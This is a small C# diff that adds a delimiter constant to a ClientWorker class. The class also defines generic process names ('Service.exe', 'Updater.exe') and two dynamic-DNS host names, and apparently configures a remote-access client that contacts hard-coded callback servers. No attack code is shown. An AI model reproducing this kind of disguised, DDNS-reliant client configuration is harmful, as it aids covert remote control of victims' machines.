@@ -14,7 +14,8 @@ namespace ClientWorker
 		public static string service = "Service.exe";
 		public static string updater = "Updater.exe";
         public static string DescriptionProcess = "Service";
-		public static List<string> ddnsHostName = new List<string>
+        public static string delimiter = "_";
+        public static List<string> ddnsHostName = new List<string>
 		{
 			"fokes1.asuscomm.com",
 			"us30.dlinkddns.com"
